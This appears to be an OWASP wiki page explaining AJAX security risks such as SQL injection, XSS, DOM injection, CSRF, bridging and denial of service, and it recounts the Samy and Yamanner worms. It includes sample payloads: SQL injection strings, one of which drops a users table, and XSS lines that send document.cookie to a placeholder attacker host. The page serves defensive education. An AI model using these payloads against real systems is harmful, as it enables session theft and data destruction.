## Introduction

**Asynchronous Javascript and XML (AJAX)** is one of the latest
techniques used by web application developers to provide a user
experience similar to that of a traditional (i.e., "pre-web")
application. Since AJAX is still a new technology, there are many
security issues that have not yet been fully researched. Some of the
security issues in AJAX include:

  - Increased attack surface with many more inputs to secure
  - Exposed internal functions of the application
  - Client access to third-party resources with no built-in security and
    encoding mechanisms
  - Failure to protect authentication information and sessions
  - Blurred line between client-side and server-side code, possibly
    resulting in security mistakes

## Attacks and Vulnerabilities

### XMLHttpRequest Vulnerabilities

AJAX uses the XMLHttpRequest(XHR) object for all communication with a
server-side application, frequently a web service. A client sends a
request to a specific URL on the same server as the original page and
can receive any kind of reply from the server. These replies are often
snippets of HTML, but can also be XML, Javascript Object Notation
([JSON](http://www.json.org)), image data, or anything else that
Javascript can process.

Secondly, in the case of accessing an AJAX page on a non-SSL connection,
the subsequent XMLHttpRequest calls are also not SSL encrypted. Hence,
the login data is traversing the wire in clear text. Using secure
HTTPS/SSL channels, which the modern day browsers support, is the
easiest way to prevent such attacks from happening.

XMLHttpRequest(XHR) objects retrieve the information of all the servers
on the web. This could lead to various other attacks such as SQL
Injection, Cross Site Scripting (XSS), etc.

### Increased Attack Surface

Unlike traditional web applications that execute completely on the
server, AJAX applications extend across the client and server, which
gives the client some power. This throws in additional ways to
potentially inject malicious content.

### SQL Injection

SQL Injection attacks (see [Testing for SQL
Injection](Testing_for_SQL_Injection_\(OWASP-DV-005\) "wikilink")) are
remote attacks on the database in which the attacker modifies SQL
statements before they are processed by the DBMS.
Typical SQL Injection attacks could be as follows (examples refer to
Microsoft SQL Server)
***Example 1***

    SELECT id FROM users WHERE name='' OR 1=1 AND pass='' OR 1=1 LIMIT 1;

This query will always return one row (unless the table is empty), and
it is likely to be the first entry in the table. For many applications,
that entry is the administrative login - the one with the most
privileges.
Note. The code fragment above tries to match userid and password values
(obtained in input) with attributes *name*, *pass* of *users*;
consequently, it appears that *users* is storing passwords in clear
text, a practice which is not recommendable.
***Example 2***

    SELECT id FROM users WHERE name='' AND pass=''; DROP TABLE users;

The above set of SQL statements drops the table *users*, causing a
Denial of Service. This consequence is possible on DBMS allowing
concatenation of multiple statements.

### Cross Site Scripting

[Cross-site Scripting (XSS)](Cross-site_Scripting_\(XSS\) "wikilink") is
a technique by which malicious content is injected in the form of
HTML/JavaScript code. XSS exploits can be used for triggering various
other attacks like cookie theft, account hijacking, phishing, and denial
of service.

The Browser and AJAX Requests look identical, so the server is not able
to classify them. Consequently, it won't be able to discern who made the
request in the background. A JavaScript program can use AJAX to request
a resource that occurs in the background without the user's knowledge.
The browser will automatically add the necessary authentication or
state-keeping information such as cookies to the request. JavaScript
code can then access the response to this hidden request and then send
more requests. This expansion of JavaScript functionality increases the
possible damage of a Cross-Site Scripting attack.

Also, an XSS attack could send requests for specific pages other than
the page the user is currently looking at. This allows the attacker to
actively look for certain content, potentially accessing the data.

The XSS payload can use AJAX requests to autonomously inject itself into
pages and easily re-inject the same host with more XSS (like a virus),
all of which can be done with no hard refresh. Thus, XSS can send
multiple requests using complex HTTP methods to propagate itself
invisibly to the user.

***Examples***

    <script>alert("howdy")</script>
    <script>document.location='http://www.example.com/pag.pl?'%20+document.cookie</script>


*Usage:*

    http://example.com/login.php?variable="><script>document.location='http://<evil-site>/cont.php?'+document.cookie</script>

This will just redirect the page to an unknown and malicious page after
logging into the original page from where the request was made.


### Client Side Injection Threats

  - *XSS exploits* can give access to sensitive client-side data, and
    can also modify client-side code.
  - *DOM Injection* is a type pf XSS injection which happens through the
    sub-objects, document location, document.URL, or document.referrer
    of the Document Object Model(DOM)

<!-- end list -->

    <SCRIPT>
    var pos=document.URL.indexOf("name=")+5;
    document.write(document.URL.substring(pos,document.URL.length));
    </SCRIPT>

  - *JSON/XML/XSLT Injection* - Injection of malicious code in the XML
    content


### AJAX Bridging

For security purposes, AJAX applications can only connect back to the
Website from which they come. For example, JavaScript with AJAX
downloaded from *site1.com* cannot make connections to *site2.com*. To
allow AJAX to contact third-party sites in this manner, the AJAX service
bridge was created. In a bridge, a host provides a Web service that acts
as a proxy to forward traffic between the JavaScript running on the
client and the third-party site. A bridge could be considered a 'Web
service to Web service' connection. An attacker could use this to access
sites with restricted access.

### Cross Site Request Forgery (CSRF)

CSRF (see [Testing for
CSRF](Testing_for_CSRF_\(OWASP-SM-005\) "wikilink")) attacks occur when
an attacker forces a victim’s web browser to send an HTTP request to any
website of his choosing (the intranet is a fair game as well). For
example, while reading this post, the HTML/JavaScript code embedded in
the web page could have forced your browser to make an off-domain
request to your bank, blog, web mail, DSL router, etc. In case such
applications are vulnerable, invisibly, CSRF could have transferred
funds, posted comments, compromised email lists, or reconfigured the
network. A characteristic of CSRF attacks is that the vulnerable
application logs' will show what appear as legitimate entries
originating from the victim, bearing no trace of the attack. This
attack, though not common, has been done before.

### Denial of Service

Denial of Service is an old attack in which an attacker or vulnerable
application forces the user to launch multiple XMLHttpRequests to a
target application against the wishes of the user. In fact, browser
domain restrictions make XMLHttpRequests useless in launching such
attacks on other domains. Simple tricks such as using image tags nested
within a JavaScript loop can do the trick more effectively. AJAX, being
on the client-side, makes the attack easier.

    <IMG SRC="http://example.com/cgi-bin/ouch.cgi?a=b">

### Browser Based Attacks

The security of web browsers depends to a great extent to the fact that
these tools integrate disparate technologies (such as HTML, Javascript,
DNS, to name a few), whose interoperability has often been achieved
without focusing much on its security implications. Furthermore, most of
the security features available in browsers are based on previous
attacks, so our browsers are not prepared for newer attacks.

There have been a number of new attacks on browsers, such as using the
browser to hack into the internal network. The JavaScript first
determines the internal network address of the PC. Then, using standard
JavaScript objects and commands, it starts scanning the local network
for Web servers. These could be computers that serve Web pages, but they
could also include routers, printers, IP phones, and other networked
devices or applications that have a Web interface. The JavaScript
scanner determines whether there is a computer at an IP address by
sending a "ping" using JavaScript "image" objects. It then determines
which servers are running by looking for image files stored in standard
places and analyzing the traffic and error messages it receives back.

Attacks that target Web browser and Web application vulnerabilities are
often conducted by HTTP and, therefore, may bypass filtering mechanisms
in place on the network perimeter. In addition, the widespread
deployment of Web applications and Web browsers gives attackers a large
number of easily exploitable targets. For example, Web browser
vulnerabilities can lead to the exploitation of vulnerabilities in
operating system components and individual applications, which can lead
to the installation of malicious code, including bots.

## Major Attacks

**MySpace Attack**

The Samy and Spaceflash worms both spread on MySpace, changing profiles
on the hugely popular social-networking Web site. In the case of Samy
(see [Technical explanation of The MySpace
Worm](http://namb.la/popular/tech.html)), MySpace input validation
controls prevent the injection of ''

<SCRIPT>

'' tags, however failed to consider all HTML tags, such as *DIV*. The
article is a good example demonstrating how hard it is to perform input
validation (particularly if you try to do it following a *black list*
based approach). AJAX was used to inject a worm into the MySpace profile
of any user viewing infected page and forced any user viewing the
infected page to add the user “Samy” to his friend list. It also
appended the words “Samy is my hero” to the victim's profile

**Yahoo\! Mail Attack**

In June 2006, the Yamanner worm infected Yahoo's mail service. The worm,
using XSS and AJAX, took advantage of a vulnerability in Yahoo Mail's
onload event handling. When an infected email was opened, the worm code
executed its JavaScript, sending a copy of itself to all the Yahoo
contacts of the infected user. The infected email carried a spoofed
'From' address picked randomly from the infected system, which made it
look like an email from a known user.

## References

**Whitepapers**

  - Brian Chess, Yekaterina Tsipenyuk O'Neil, Jacob West, "JavaScript
    Hijacking" -
    <http://www.fortify.com/servlet/downloads/public/JavaScript_Hijacking.pdf>
  - Billy Hoffman, "Ajax(in) Security" -
    <http://www.blackhat.com/presentations/bh-usa-06/BH-US-06-Hoffman.pdf>
  - Billy Hoffman, "Analysis of Web Application Worms and Viruses -
    <http://www.blackhat.com/presentations/bh-usa-06/BH-US-06-Hoffman_web.pdf>
    ",SPI Labs
  - Billy Hoffman, "Ajax Security Dangers" -
    <http://www.spidynamics.com/assets/documents/AJAXdangers.pdf> ",SPI
    Labs
  - “Ajax: A New Approach to Web Applications”, Adaptive Path -
    <http://www.adaptivepath.com/publications/essays/archives/000385.php>
    Jesse James Garrett
  - <http://en.wikipedia.org/wiki/AJAX> AJAX
  - <http://ajaxpatterns.org> AJAX Patterns
  - Billy Hoffman, "Ajax Security Dangers" -
    <http://rmccurdy.com/scripts/docs/spidynamics/AJAXdangers.pdf> ",SPI
    Labs

[Category:OWASP AJAX Security
Project](Category:OWASP_AJAX_Security_Project "wikilink")